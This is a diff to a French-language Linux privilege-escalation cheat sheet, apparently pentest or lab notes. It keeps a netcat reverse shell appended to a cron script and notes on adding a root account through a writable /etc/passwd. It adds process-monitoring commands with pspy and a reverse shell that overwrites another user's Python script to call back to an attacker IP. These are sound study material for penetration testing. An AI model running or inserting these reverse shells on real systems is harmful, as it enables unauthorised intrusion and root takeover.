@@ -295,12 +295,6 @@ echo >> user_backups.sh
 echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <kali-ip> 4444 >/tmp/f" >> user_backups.sh
 ```
 
-**Listener sur Kali**
-
-```bash
-nc -lnvp 4444
-```
-
 ### Abusing password authentication
 
 Si `/etc/passwd` est world-writable, on peut y ajouter un compte root arbitraire - le hash dans la deuxième colonne prend la priorité sur `/etc/shadow`.
@@ -421,3 +415,43 @@ file cve-2017-16995
 ```
 
 Compiler sur la cible évite les problèmes de cross-compilation (bibliothèques, architecture).
+
+## Monitorer les nouveaux processus 
+
+### Bash
+
+```bash
+while true; do diff <(ps aux) <(sleep 0.1 && ps aux) | grep '^>' | grep -v 'kworker\|defunct\|systemd\|ps aux'; done
+```
+### pspy
+**Versions précompilées**
+[https://github.com/DominicBreuker/pspy/releases](https://github.com/DominicBreuker/pspy/releases)
+
+- `pspy64s` = statique 64 bits (en théorie sans dépendances)
+- Si erreur glibc, prendre une release plus ancienne (v1.2.0 fonctionne bien)
+
+Vérifier la glibc cible avant :
+```bash
+ldd --version
+```
+
+**Compilation manuelle**
+```bash
+git clone https://github.com/DominicBreuker/pspy
+cd pspy
+CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build -ldflags "-s -w" -o pspy64s .
+```
+
+**Utilisation**
+```bash
+./pspy64s
+```
+
+### Reverse shell dans process python
+
+```bash
+# Commande éxécuté par un autre user
+python2.7 /opt/aerospike/bin/asadm --asinfo-mode -e 'STATUS' 
+
+echo "/bin/bash -c 'bash -i >& /dev/tcp/192.168.45.245/443 0>&1'" > /opt/aerospike/bin/asadm
+```
